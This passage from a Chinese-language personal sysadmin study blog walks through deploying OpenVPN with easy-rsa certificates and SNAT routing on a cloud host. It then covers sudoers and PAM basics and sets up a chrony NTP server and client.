user()<br></code></pre></td></tr></table></figure><h1 id="mycat暂时性的痛点"><a href="#mycat暂时性的痛点" class="headerlink" title="mycat暂时性的痛点"></a>mycat暂时性的痛点</h1><p>1.本身的proxy节点就存在单点故障的问题</p><p>2.无法保证后端主节点挂掉后，从节点可以替换上来，可以使用MHA高可用来实现</p><p>重点：MySQL主从复制的实现，主从数据的同步，binlog的pos记录，配置，可以在5.7后的版本开启gtid自动记录binlog的pos，可以比较简便的实现主从复制的binlog pos</p><p><img src="2792175-20221007225927051-1159141991.png" alt="img"></p><h1 id="6-实现openvpn部署，并且测试通过，输出博客或者自己的文档存档。"><a href="#6-实现openvpn部署，并且测试通过，输出博客或者自己的文档存档。" class="headerlink" title="6.实现openvpn部署，并且测试通过，输出博客或者自己的文档存档。"></a>6.实现openvpn部署，并且测试通过，输出博客或者自己的文档存档。</h1><h2 id="openVPN"><a href="#openVPN" class="headerlink" title="openVPN"></a>openVPN</h2><p>软件VPN产品</p><p>VPN常见的方式：点对点，点对多点，点对多点：客户端—企业内部的网络</p><p>软件端：分为服务器端和客户端软件</p><p>环境：华为云机器—公网机器，模拟OPENVPN连接到华为云的内网环境</p><h2 id="1-准备软件包，准备-openvpn目录"><a href="#1-准备软件包，准备-openvpn目录" class="headerlink" title="1.准备软件包，准备/openvpn目录"></a>1.准备软件包，准备/openvpn目录</h2><h2 id="记得要修改vars-example—-gt-vars，不然无法识别vars文件"><a href="#记得要修改vars-example—-gt-vars，不然无法识别vars文件" class="headerlink" title="记得要修改vars.example—&gt;vars，不然无法识别vars文件"></a><strong>记得要修改vars.example—&gt;vars，不然无法识别vars文件</strong></h2><h2 id="openvpn机器需要关闭防火墙等：systemctl-disable-–now-firewalld"><a href="#openvpn机器需要关闭防火墙等：systemctl-disable-–now-firewalld" class="headerlink" title="openvpn机器需要关闭防火墙等：systemctl disable –now firewalld"></a>openvpn机器需要关闭防火墙等：systemctl disable –now firewalld</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.安装openvpn和证书颁发软件easy-rsa---&gt;EPEL源<br>yum list | grep openven<br>openvpn.x86_64<br><br>yum -y install openvpn<br><br>yum list | grep easy-rsa<br>yum -y install easy-rsa<br><br>2.查看对应的路径<br><span class="hljs-built_in">ls</span> /usr/share/easy-rsa/3<br>easyrsa  openssl-easyrsa.cnf  x509-types<br><br>easyrsa就是一个执行脚本，专门用于生成证书的，需要将它放到自建的目录下<br><br><span class="hljs-built_in">mkdir</span> /openvpn ; <span class="hljs-built_in">cp</span> -r /usr/share/easy-rsa/3/* /openvpn<br><br>拷贝模板文件<br>/usr/share/doc/easy-rsa-3.0.8/vars.example<br><span class="hljs-built_in">cp</span> -r /usr/share/doc/easy-rsa-3.0.8/vars.example /openvpn<br><br><br><br>easy-rsa介绍：./easyrsa<br><br>3.修改证书的颁发有效期，申请CA的证书，自建CA机构<br>修改模板文件<br><br>vim /CA /CERT<br>set_var EASYRSA_CA_EXPIRE      3650 ---&gt;CA颁发的证书，默认10年 3650天<br>set_var EASYRSA_CERT_EXPIRE    825  ---&gt;用户颁发的CERT证书，默认825天，可以随时调整，但是不对一般发的证书有效；服务器的证书有效期<br><br>set_var EASYRSA_CA_EXPIRE       36500 <span class="hljs-comment">##100年</span><br>set_var EASYRSA_CERT_EXPIRE     3650 <span class="hljs-comment">##10年</span><br></code></pre></td></tr></table></figure><h2 id="2-准备初始文件，搭建CA证书、服务器证书"><a href="#2-准备初始文件，搭建CA证书、服务器证书" class="headerlink" title="2.准备初始文件，搭建CA证书、服务器证书"></a>2.准备初始文件，搭建CA证书、服务器证书</h2><p>执行指令，生成新的pki文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.初始化<br>./easyrsa init-pki<br><br>init-pki complete; you may now create a CA or requests.<br>Your newly created PKI <span class="hljs-built_in">dir</span> is: /openvpn/pki<br><br>2.生成CA的私钥以及自己的证书，<span class="hljs-comment">##nopass表示没有密码，生产中建议配置密码，以后从自己的CA颁发证书给到用户的时候，需要知道类似管理员密码才能进行颁发</span><br>./easyrsa build-ca nopass<br>Common Name (eg: your user, host, or server name) [Easy-RSA CA]:<br><br>CA creation complete and you may now import and sign cert requests.<br>Your new CA certificate file <span class="hljs-keyword">for</span> publishing is at:<br>/openvpn/pki/ca.crt<br><br>---&gt;颁发给CA的证书<br><br><span class="hljs-comment">##已经有了ca.crt和ca.key，证书和私钥</span><br>tree /openvpn<br><br>3.服务器端创见证书申请，使用.crt来申请，申请一般是.pem证书申请<br>./easyrsa gen-req server nopass<br>多了服务器的私钥<br>private<br>│   │   ├── ca.key<br>│   │   └── server.key<br><br>4.创建服务端证书，可以拿到windows端看一下时间，标注是生成服务端的证书<br>./easyrsa sign server server<br>issued<br>│   │   └── server.crt<br><br>yum provides sz<br>lrzsz-0.12.20-36.el7.x86_64 : The lrz and lsz modem communications programs<br>Repo        : @base<br>Matched from:<br>Filename    : /usr/bin/sz<br>yum -y install lrzsz<br><br>sz pki/issued/server.crt <br><br><br><br>5.生成DH秘钥交换文件<br>./easyrsa gen-dh<br>ll pki/dh.pem <br>-rw------- 1 root root 424 Sep 25 09:24 pki/dh.pem<br>DH parameters of size 2048 created at /openvpn/pki/dh.pem<br></code></pre></td></tr></table></figure><p><img src="2792175-20221007225927353-1039172271.png" alt="img"></p><p><img src="2792175-20221007225927603-1461182136.png" alt="img"></p><p>时间和上面的vars时间吻合，颁发给服务端的证书有效期是10年，同理，颁发给客户端的也是10年</p><h2 id="3-颁发客户端的证书"><a href="#3-颁发客户端的证书" class="headerlink" title="3.颁发客户端的证书"></a>3.颁发客户端的证书</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ecs-b679 openvpn]<span class="hljs-comment"># ./easyrsa gen-req catyer nopass</span><br><br><span class="hljs-comment">##包含请求文件和私钥，都是基于私钥和请求来生成证书的.crt</span><br>req: /openvpn/pki/reqs/catyer.req<br>key: /openvpn/pki/private/catyer.key<br><br>│?? ├── reqs<br>│?? │?? ├── catyer.req<br>│?? │?? └── server.req<br></code></pre></td></tr></table></figure><p>由于客户端和服务端在CA机构下都属于客户端，所以需要修改一下CERT文件配置，修改有效期</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ecs-b679 openvpn]<span class="hljs-comment"># ls</span><br>3  easyrsa  openssl-easyrsa.cnf  pki  vars  x509-types<br><br><span class="hljs-comment">#set_var EASYRSA_CERT_EXPIRE    3650 ##服务端10年 ---&gt;server端已经颁发过了，所以这里的修改不会对已有的证书生效</span><br>set_var EASYRSA_CERT_EXPIRE     730 <span class="hljs-comment">##客户端2年</span><br><br><span class="hljs-comment">##基于这个req请求文件来申请的</span><br>reqs<br>│   │   ├── catyer.req<br><br>[root@ecs-b679 openvpn]<span class="hljs-comment"># ./easyrsa sign client catyer</span><br><span class="hljs-built_in">yes</span><br>Write out database with 1 new entries<br>Data Base Updated<br><br>Certificate created at: /openvpn/pki/issued/catyer.crt<br><br>tree<br>issued<br>│   │   ├── catyer.crt<br><br>---&gt;两年的有效期<br></code></pre></td></tr></table></figure><p><img src="2792175-20221007225927871-961094566.png" alt="img"></p><h2 id="4-整理CA证书和客户端证书"><a href="#4-整理CA证书和客户端证书" class="headerlink" title="4.整理CA证书和客户端证书"></a>4.整理CA证书和客户端证书</h2><p>CA和服务端放一起，属于服务端的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##检查openvpn的安装情况</span><br>rpm -ql openvpn | grep certs<br><br><span class="hljs-comment">##需要将几个文件先放到/server目录下</span><br>/etc/openvpn<br>/etc/openvpn/client<br>/etc/openvpn/server<br><br><span class="hljs-built_in">mkdir</span> -p /etc/openvpn/certs/<br><span class="hljs-built_in">cp</span> pki/ca.crt pki/dh.pem pki/issued/server.crt pki/private/server.key /etc/openvpn/certs/<br><br>ll /etc/openvpn/certs/<br>total 20<br>-rw------- 1 root root 1176 Sep 25 10:50 ca.crt<br>-rw------- 1 root root  424 Sep 25 10:50 dh.pem<br>-rw------- 1 root root 4547 Sep 25 10:50 server.crt<br>-rw------- 1 root root 1704 Sep 25 10:50 server.key<br></code></pre></td></tr></table></figure><p>客户端创建目录，拷贝CA证书，客户端的私钥和证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /etc/openvpn/client/catyer<br><br><span class="hljs-built_in">cp</span> pki/ca.crt  pki/issued/catyer.crt pki/private/catyer.key /etc/openvpn/client/catyer<br><br>ll /etc/openvpn/client/catyer<br>total 16<br>-rw------- 1 root root 1176 Sep 25 10:55 ca.crt<br>-rw------- 1 root root 4432 Sep 25 10:55 catyer.crt<br>-rw------- 1 root root 1704 Sep 25 10:55 catyer.key<br></code></pre></td></tr></table></figure><h2 id="5-配置openvpn服务端"><a href="#5-配置openvpn服务端" class="headerlink" title="5.配置openvpn服务端"></a>5.配置openvpn服务端</h2><p>复制服务端的模板文件，路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/share/doc/openvpn-2.4.12/sample/sample-config-files/server.conf /etc/openvpn/<br><br>[root@ecs-b679 openvpn]<span class="hljs-comment"># ls</span><br>certs  client  server  server.conf<br><br><span class="hljs-built_in">mkdir</span> -p /var/log/openvpn<br><span class="hljs-built_in">chown</span> -R openvpn.openvpn /var/log/openvpn<br><br>vim server.conf<br><br>port 1194 <span class="hljs-comment">##端口</span><br>proto tcp<br>dev tun<br>ca /etc/openvpn/certs/ca.crt <span class="hljs-comment">##默认的CA证书</span><br>cert /etc/openvpn/certs/server.crt <span class="hljs-comment">##默认的服务端证书</span><br>key /etc/openvpn/certs/server.key  <span class="hljs-comment"># This file should be kept secret ，服务端私钥</span><br>dh /etc/openvpn/certs/dh.pem <span class="hljs-comment">##DH秘钥交换文件</span><br>server 10.8.0.0 255.255.255.0 <span class="hljs-comment">##连上VPN后，给客户端分配的地址</span><br>push <span class="hljs-string">&quot;route 192.168.0.0 255.255.255.0&quot;</span> <span class="hljs-comment">##路由修改为云上机器的子网网段</span><br>keepalive 10 120 <span class="hljs-comment">##心跳</span><br>cipher AES-256-CBC<br>compress lz4-v2<br>push <span class="hljs-string">&quot;compress lz4-v2&quot;</span><br>max-clients 2048<br>user openvpn <span class="hljs-comment">##安装VPN服务的时候默认创建的用户</span><br>group openvpn<br>status /var/log/openvpn/openvpn-status.log <span class="hljs-comment">##创建日志路径</span><br>log-append  /var/log/openvpn/openvpn.log<br>verb 3<br>mute 20<br><br><span class="hljs-comment">##这一堆暂时注释掉</span><br><span class="hljs-comment">#duplicate-cn</span><br><span class="hljs-comment">#client-to-client</span><br><span class="hljs-comment">#crl-verify /etc/openvpn/certs/crl.pem</span><br><span class="hljs-comment">#script-security 3 </span><br><span class="hljs-comment">#auth-user-pass-verify /etc/openvpn/checkpsw.sh via-env</span><br><span class="hljs-comment">#username-as-common-name </span><br><br>systemctl <span class="hljs-built_in">enable</span> --now openvpn@server<br>ss -ntl | grep 1194<br>ss -ntl | grep 1194<br>LISTEN     0      32           *:1194                     *:*<br></code></pre></td></tr></table></figure><p>配置客户端链接文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/openvpn/client/catyer<br><br>vim client.ovpn<br>client<br>dev tun<br>proto tcp<br>remote   openvpn.cwjcloudtest.cn 1194  <span class="hljs-comment">##公网IP地址+端口，华为云上的公网域名解析</span><br>resolv-retry infinite<br>nobind<br><span class="hljs-comment">#persist-key</span><br><span class="hljs-comment">#persist-tun</span><br>ca ca.crt<br>cert catyer.crt<br>key catyer.key<br>remote-cert-tls server<br><span class="hljs-comment">#tls-auth ta.key 1</span><br>cipher AES-256-CBC<br>verb 3<br>compress lz4-v2<br></code></pre></td></tr></table></figure><h2 id="6-安装openvpn-GUI软件"><a href="#6-安装openvpn-GUI软件" class="headerlink" title="6.安装openvpn GUI软件"></a>6.安装openvpn GUI软件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##将catyer这个目录打包放到config目录下</span><br>[root@ecs-b679 catyer]<span class="hljs-comment"># tar czf catyer.tar.gz .</span><br>[root@ecs-b679 catyer]<span class="hljs-comment"># ls</span><br>ca.crt  catyer.crt  catyer.key  catyer.tar.gz  client.ovpn<br>[root@ecs-b679 catyer]<span class="hljs-comment"># sz catyer.tar.gz </span><br><br>放到windows的/openvpn/config下面<br>尝试连接，一直是连接中<br></code></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/2792175/202210/2792175-20221007225928170-1484782578.png" alt="img"></p><p><img src="2792175-20221007225928503-428177792.png" alt="img"></p><h2 id="7-测试联通到云上的web服务器"><a href="#7-测试联通到云上的web服务器" class="headerlink" title="7.测试联通到云上的web服务器"></a>7.测试联通到云上的web服务器</h2><p>建立成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##线下机器ping，ssh</span><br>云上机器抓包看看：tcpdump -i eth0 -nn icmp<br><br>云上机器需要加路由指向192.168.0.68<br>route -n看下网关<br>ip route add 192.168.0.68/24 via 192.168.0.253 dev eth0<br><br><span class="hljs-comment">##删除路由</span><br>ip route del xxx<br><br><span class="hljs-comment">##使用iptables规则来放通，SNAT转换，使线下机器能够访问到192.168.0.63网段，认为是openvpn服务访问到内网的机器，可以的</span><br><span class="hljs-comment">##所有源为10.8.0.0的请求(因为添加了openvpn server端服务，openvpn机器自动起了一个网卡，IP为inet 10.8.0.1 peer 10.8.0.2/32 scope global tun0)，所以SNAT源为10.8.0.0，包括线下所有客户端+这个网卡，目的为除了10.8.0.0,，转换成192.168.0.63，这个eth0网卡的IP地址</span><br>iptables -t nat -I POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to-source 192.168.0.63<br><br>DNAT写法：貌似还不需要<br><br><span class="hljs-comment">##可以搭建nginx站点访问测试</span><br>192.168.0.100:80<br></code></pre></td></tr></table></figure><p><img src="2792175-20221007225928965-1058440174.png" alt="img"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第五周</title>
    <link href="/2023/07/28/%E7%AC%AC%E4%BA%94%E5%91%A8/"/>
    <url>/2023/07/28/%E7%AC%AC%E4%BA%94%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="1-SUDO-PAM配置规范说明"><a href="#1-SUDO-PAM配置规范说明" class="headerlink" title="1.SUDO,PAM配置规范说明"></a>1.SUDO,PAM配置规范说明</h1><h2 id="sudo机制"><a href="#sudo机制" class="headerlink" title="sudo机制"></a>sudo机制</h2><p>root用户允许普通用户执行一些命令，或者直接代替/root去执行所有命令</p><p>su catyer：切换用户</p><p>su：切换到root用户执行</p><p>sudo配置：一般是去到/etc/sudoers配置对应的用户，用户上配置对应的权限，或者是执行的命令</p><p>需要注意的是：生产过程中一般给不同的业务人员不同的权限，创建对应的系统用户，或者对不同的用户授予不同的命令权限</p><p>授权给catyer用户，代表可以代替root用户执行ls命令，但是在执行的时候需要加上sudo；但是除了ls命令（对root用户权限下）的操作外，其他的操作需要额外的授权，如果是ALL，则是全部命令</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##查看有哪些用户有登陆权限，授权给catyer用户执行ifconfig的权限</span><br>grep /bin/bash /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>catyer:x:1000:1000:catyer:/home/catyer:/bin/bash<br><br>vim /etc/sudoers<br>[root@master etc]<span class="hljs-comment">#ll sudoers</span><br>-r--r----- 1 root root 4328 Sep 30  2020 sudoers<br><br><span class="hljs-comment">##需要修改sudoers文件的写权限</span><br>[root@master etc]<span class="hljs-comment">#chmod u+w sudoers</span><br>[root@master etc]<span class="hljs-comment">#ll sudoers</span><br>-rw-r----- 1 root root 4328 Sep 30  2020 sudoers<br><br><span class="hljs-comment">##修改sudoers文件</span><br>vim sudoers<br><br><span class="hljs-comment">##默认允许root用户执行所有的命令</span><br><span class="hljs-comment">## Allow root to run any commands anywhere </span><br>root    ALL=(ALL)       ALL<br><span class="hljs-comment">#root    ALL(在哪个主机)=(代表的用户，可以写root)       ALL(COMMAND指令)</span><br><span class="hljs-comment">#which +command：表示查找这个命令在哪里</span><br><span class="hljs-built_in">which</span> <span class="hljs-built_in">ls</span><br>catyer  ALL=(root)      /usr/bin/ls <span class="hljs-comment">#允许catyer代替root用户执行ls /root命令</span><br>catyer  ALL=(root)      /usr/bin/ls <span class="hljs-comment">#允许catyer代替root用户执行ls /root命令</span><br>catyer  ALL=(root)      /usr/bin/ls /root,/usr/bin/mount /dev/sdb /mnt/mount <span class="hljs-comment">#</span><br><br><span class="hljs-comment">##测试root权限，访问到ls /root用户，OK</span><br>sudo <span class="hljs-built_in">ls</span> /root/tmp<br>0.txt  2.txt  6.txt 7.txt     99944111.txt  99944113.txt  999442.txt  999444.txt<br>1.txt  3.txt  77777.txt  999000.txt  99944112.txt  999441.txt 999443.txt  999.txt<br><br>但是想执行<span class="hljs-built_in">cd</span>命令就不行了，需要添加/bin/cd /root/tmp这个权限，权限颗粒度到这个级别了<br>sudo <span class="hljs-built_in">cd</span> /root/tmp<br>Sorry, user catyer is not allowed to execute <span class="hljs-string">&#x27;/bin/cd /root/tmp&#x27;</span> as root on master.<br></code></pre></td></tr></table></figure><h2 id="pam机制"><a href="#pam机制" class="headerlink" title="pam机制"></a>pam机制</h2><p>PAM：属于一种验证性的模块，或者叫做验证性的接口，可以给到其他程序或者服务调用pam认证模块去实现认证功能，只关注如何验证用户的API</p><p>PAM机制自己有统一规范的API接口，供各程序调用</p><p>查看主配置文件目录：ls /etc/pam.d</p><p><img src="2792175-20220912180413947-560658352.png" alt="img"></p><p>案例：查看某个服务是否支持PAM认证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##查看sshd服务支持pam库</span><br>ldd `<span class="hljs-built_in">which</span> sshd` | grep libpam<br>libpam.so.0 =&gt; /lib64/libpam.so.0 (0x00007f3627884000)<br></code></pre></td></tr></table></figure><p>PAM认证流程</p><p>1.某个命令或者程序执行，比如ssh 10.0.0.128</p><p>2.找到sshd这个服务对应的libpam.so.d</p><p>3.pam库调用对应的验证模块进行验证</p><p>4.pam决定下一步该怎么走</p><h1 id="2-chrony搭建私有ntp服务"><a href="#2-chrony搭建私有ntp服务" class="headerlink" title="2.chrony搭建私有ntp服务"></a>2.chrony搭建私有ntp服务</h1><p>搭建chrony NTP服务器，chrony：NTP同步时间服务</p><p>客户端程序：chronyc</p><p>服务端程序：chronyd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##环境：chrony服务器1 10.0.0.128</span><br><span class="hljs-comment">##chrony客户端 10.0.0.132</span><br><span class="hljs-comment">##服务端配置</span><br>rpm -q chrony || yum -y install chrony<br>systemctl <span class="hljs-built_in">enable</span> --now chronyd<br><br>vim /etc/chrony.conf<br><br><span class="hljs-comment">##配置各大云厂商的NTP服务器</span><br>server time1.cloud.tencent.com iburst <br>server time2.cloud.tencent.com iburst<br><br><span class="hljs-comment">##配置允许10.0.0.0段的机器访问，其余默认</span><br>allow 10.0.0.0/16<br><br>systemctl restart chronyd<br><span class="hljs-comment">##关闭防火墙</span><br>systemctl <span class="hljs-built_in">disable</span> --now firewalld <br><br><span class="hljs-comment">##查看本地的时区</span><br>[root@master ~]<span class="hljs-comment">#timedatectl</span><br>      Local time: Tue 2022-08-30 23:19:04 CST<br>  Universal time: Tue 2022-08-30 15:19:04 UTC<br>        RTC time: Tue 2022-08-30 15:19:04<br>       Time zone: Asia/Shanghai (CST, +0800)<br>     NTP enabled: <span class="hljs-built_in">yes</span><br>NTP synchronized: <span class="hljs-built_in">yes</span><br> RTC <span class="hljs-keyword">in</span> <span class="hljs-built_in">local</span> TZ: no<br>      DST active: n/a<br><br><span class="hljs-comment">##查看有哪些时区可选</span><br>timedatectl list-timezones |  grep  <span class="hljs-string">&quot;Asia/Shanghai&quot;</span><br><span class="hljs-comment">##设置本地时区</span><br>timedatectl set-timezone Asia/Shanghai<br><br><span class="hljs-comment">##查看本地的时间时区</span><br><span class="hljs-built_in">date</span><br>Mon Sep  5 21:37:25 CST 2022<br></code></pre></td></tr></table></figure><p>客户端chronyc配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/chorny.conf<br>server 10.0.0.128 iburst<br>systemctl restart chronyd<br><br><span class="hljs-comment">##查看本地的时区以及配置</span><br>[root@rocky ~]<span class="hljs-comment">#timedatectl</span><br>               Local time: 二 2022-08-30 15:28:35 UTC<br>           Universal time: 二 2022-08-30 15:28:35 UTC<br>                 RTC time: 二 2022-08-30 15:28:35<br>                Time zone: n/a (UTC, +0000)<br>System clock synchronized: no<br>              NTP service: active<br>          RTC <span class="hljs-keyword">in</span> <span class="hljs-built_in">local</span> TZ: no<br><br><span class="hljs-comment">##配置时区</span><br>[root@rocky ~]<span class="hljs-comment">#timedatectl set-timezone Asia/Shanghai</span><br>[root@rocky ~]<span class="hljs-comment">#timedatectl</span><br>               Local time: 二 2022-08-30 23:34:03 CST<br>           Universal time: 二 2022-08-30 15:34:03 UTC<br>                 RTC time: 二 2022-08-30 15:34:03<br>                Time zone: Asia/Shanghai (CST, +0800)<br>System clock synchronized: <span class="hljs-built_in">yes</span><br>              NTP service: active<br>          RTC <span class="hljs-keyword">in</span> <span class="hljs-built_in">local</span> TZ: no<br></code></pre></td></tr></table></figure><p>chronyc客户端命令实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 